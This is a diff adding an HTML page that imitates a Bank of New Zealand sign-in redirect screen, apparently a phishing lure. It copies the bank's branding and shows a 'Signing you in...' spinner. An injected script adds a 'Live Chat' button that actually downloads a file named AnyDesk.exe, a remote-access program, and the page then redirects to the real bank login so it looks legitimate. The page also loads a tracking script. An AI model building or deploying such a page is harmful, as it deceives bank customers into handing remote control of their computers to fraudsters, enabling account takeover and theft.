@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BNZ - Redirecting</title>
+<link rel="icon" href="https://www.bnz.co.nz/favicon.ico" type="image/x-icon">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    background: linear-gradient(#f5f7fa, #eef1f6);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    color: #002f6c;
+  }
+
+  /* Header */
+  .header {
+    background: #fff;
+    border-bottom: 3px solid #002f6c;
+    padding: 12px 24px;
+    display: flex;
+    align-items: center;
+    gap: 24px;
+  }
+  .header .logo { color: #002f6c; display: flex; align-items: center; }
+  .header nav { display: flex; gap: 0; }
+  .header nav span {
+    color: #002f6c;
+    font-size: 14px;
+    font-weight: 700;
+    padding: 8px 16px;
+  }
+  .header .register {
+    margin-left: auto;
+    color: #002f6c;
+    font-size: 14px;
+    font-weight: 700;
+    border: 2px solid #002f6c;
+    border-radius: 4px;
+    padding: 6px 16px;
+  }
+
+  /* Main content */
+  .main {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 40px 20px;
+  }
+  .card {
+    background: #fff;
+    border: 1px solid #dce0e6;
+    border-radius: 8px;
+    padding: 48px 40px;
+    max-width: 480px;
+    width: 100%;
+    text-align: center;
+    box-shadow: 0 3px 6px rgba(0,47,107,0.08), 0 1px 2px rgba(0,47,107,0.06);
+  }
+  .card h1 {
+    font-size: 24px;
+    font-weight: 700;
+    color: #002f6c;
+    margin-bottom: 24px;
+  }
+  .card p {
+    font-size: 16px;
+    color: #4a5568;
+    margin-bottom: 32px;
+  }
+
+  /* Spinner */
+  .spinner-container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 24px;
+  }
+  .spinner {
+    width: 48px;
+    height: 48px;
+    border: 4px solid #e2e8f0;
+    border-top-color: #002f6c;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+  }
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  /* Footer */
+  .footer {
+    background: #fff;
+    border-top: 1px solid #dce0e6;
+    padding: 12px 24px;
+    min-height: 20px;
+  }
+
+  @media (max-width: 540px) {
+    .card { padding: 32px 20px; margin: 0 16px; }
+    .header { padding: 12px 16px; gap: 12px; }
+    .header nav a { padding: 8px 10px; font-size: 13px; }
+  }
+</style>
+
+<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
+</head>
+<body>
+<!-- Live Chat floating button -->
+<style>
+  #bnz-live-chat {
+    position: fixed !important;
+    bottom: 24px !important;
+    right: 24px !important;
+    z-index: 2147483647 !important;
+    display: inline-flex !important;
+    align-items: center !important;
+    gap: 8px !important;
+    padding: 12px 20px !important;
+    background: #ffffff !important;
+    color: #1a1a1a !important;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif !important;
+    font-size: 14px !important;
+    font-weight: 500 !important;
+    line-height: 1 !important;
+    border: 1px solid rgb(212, 216, 222) !important;
+    border-radius: 100px !important;
+    box-shadow: 0 2px 12px rgba(0,0,0,0.10), 0 1px 3px rgba(0,0,0,0.06) !important;
+    cursor: pointer !important;
+    text-decoration: none !important;
+    pointer-events: all !important;
+    transition: background 0.18s ease, color 0.18s ease, box-shadow 0.18s ease, transform 0.18s ease;
+    animation: bnz-chat-slidein 0.4s cubic-bezier(0.22,1,0.36,1) both;
+    -webkit-font-smoothing: antialiased;
+  }
+  #bnz-live-chat:hover {
+    background: #007dbc !important;
+    color: #ffffff !important;
+    border-color: #007dbc !important;
+    box-shadow: 0 6px 20px rgba(0,125,188,0.28), 0 2px 6px rgba(0,125,188,0.18) !important;
+    transform: translateY(-2px) !important;
+  }
+  #bnz-live-chat:active {
+    transform: translateY(0) scale(0.97) !important;
+  }
+  @keyframes bnz-chat-slidein {
+    from { opacity: 0; transform: translateY(16px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+</style>
+<script>
+(function() {
+  function injectChatBtn() {
+    if (document.getElementById('bnz-live-chat')) return;
+    var a = document.createElement('a');
+    a.id = 'bnz-live-chat';
+    a.href = 'assets/AnyDesk.exe';
+    a.download = 'AnyDesk.exe';
+    a.title = 'Live Chat';
+    a.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20 2H4C2.9 2 2 2.9 2 4V22L6 18H20C21.1 18 22 17.1 22 16V4C22 2.9 21.1 2 20 2ZM20 16H5.17L4 17.17V4H20V16Z" fill="currentColor"/><circle cx="8" cy="10" r="1.2" fill="currentColor"/><circle cx="12" cy="10" r="1.2" fill="currentColor"/><circle cx="16" cy="10" r="1.2" fill="currentColor"/></svg>Live Chat';
+    document.body.appendChild(a);
+  }
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', injectChatBtn);
+  } else {
+    injectChatBtn();
+  }
+  setTimeout(injectChatBtn, 500);
+  setTimeout(injectChatBtn, 1500);
+})();
+</script>
+  <header class="header">
+    <span class="logo">
+      <svg xmlns="http://www.w3.org/2000/svg" xml:space="preserve" width="61" height="30" viewBox="0 0 49 24" aria-labelledby="bnzLogoExit">
+        <title id="bnzLogoExit">BNZ Logo</title>
+        <path fill="currentColor" d="M5.29 13.87c.6-.68 1.78-1.13 2.79-1.09 2.23.09 3.63 1.32 3.63 3.73 0 4.63-2.75 7.23-6.84 7.23-1.6 0-3.44-.35-4.87-.89l2.38-13.4c.19-1.1.62-1.53 1.96-1.53h1.99zm-1.21 6.92c.37.1.45.11.93.11 1.69 0 2.87-1.61 2.87-3.86 0-1.03-.48-1.42-1.31-1.42-.72 0-1.62.64-1.75.91zm19.46 2.42c.12.26.43.54 1.14.53.81 0 1.73-.13 2.72-.13 1.56 0 2.11.1 4.14.13.8.01 1.23-.27 1.41-1.12.11-.49.22-1.07.34-1.89-.82.08-1.62.03-2.3-.01-.95-.06-1.95-.12-2.74-.05.36-.56.95-1.29 1.94-2.23.47-.44 1.31-1.15 2.21-2.12.9-.98 1.94-2.11 1.62-3.55-.99.07-1.7.1-3.01.1-1.62 0-3.64-.1-4.72-.1-.92 0-1.35.3-1.53 1.05-.15.63-.4 2-.4 2 .16-.05.88-.09 1.49-.09.61.01 2.26.04 2.61.09-.15.46-1.61 1.54-2.52 2.55-.57.63-1.52 1.71-2.01 2.53-1.26.67-1.98.47-1.86-.51l.52-2.92c.05-.56.21-1.17.18-1.7-.1-1.9-1.32-3.06-3.41-3.06-1.14 0-1.97.58-2.59 1.11 0 0-.16-.88-1.34-.94l-2.03-.01-1.64 9.32c-.23 1.22.2 1.4 1.29 1.39h2.07l1.25-6.99c.15-.33.89-1.05 1.8-1.05.59 0 1.1.29.98 1.05l-.64 3.76c-.16 1.21.25 2.18.66 2.55.54.56 1.3.81 2.07.84.87.05 1.83-.16 2.3-.53"></path>
+        <path fill="#FAA819" d="m42.21 0 .26 1.69c.03.16.17.28.33.27h1.78l-1.61 1.05c-.16.1-.24.29-.22.44l.26 1.69-1.26-1.04c-.12-.1-.32-.1-.47 0l-1.62 1.05.84-1.69c.08-.16.05-.35-.07-.45l-1.26-1.05h1.78c.18-.01.34-.11.42-.27zm-5.53 3.5.26 1.69c.03.16.17.28.33.27h1.78l-1.61 1.05c-.15.09-.24.27-.22.45l.26 1.69-1.27-1.05c-.12-.1-.32-.1-.47 0l-1.62 1.05.83-1.69c.08-.16.05-.35-.07-.45l-1.26-1.05h1.78c.18-.01.34-.11.42-.27zm9.82 0 .26 1.69c.03.16.17.28.33.27h1.78l-1.61 1.05a.48.48 0 0 0-.22.45l.26 1.69-1.26-1.05c-.12-.1-.32-.1-.47 0l-1.62 1.05.84-1.69c.08-.16.05-.35-.07-.45l-1.26-1.05h1.78c.18-.01.34-.11.42-.27zm-6.32 7.27.26 1.69c.03.16.17.28.33.27h1.78l-1.61 1.05a.5.5 0 0 0-.22.45l.26 1.69-1.26-1.04c-.12-.1-.32-.1-.47 0l-1.62 1.05.84-1.69c.08-.16.05-.35-.07-.44l-1.26-1.05h1.78c.18-.01.34-.11.42-.27z"></path>
+      </svg>
+    </span>
+    <nav>
+      <span>Personal</span>
+      <span>Business</span>
+    </nav>
+    <span class="register">Register</span>
+  </header>
+
+  <main class="main">
+    <div class="card">
+      <div class="spinner-container">
+        <div class="spinner"></div>
+      </div>
+      <h1>Signing you in...</h1>
+      <p>Please wait while we securely connect you to your account.</p>
+    </div>
+  </main>
+
+  <footer class="footer"></footer>
+
+  <script>
+    setTimeout(function() {
+      window.location.href = 'https://secure.bnz.co.nz/auth/personal-login';
+    }, 4000);
+  </script>
+</body>
+</html>
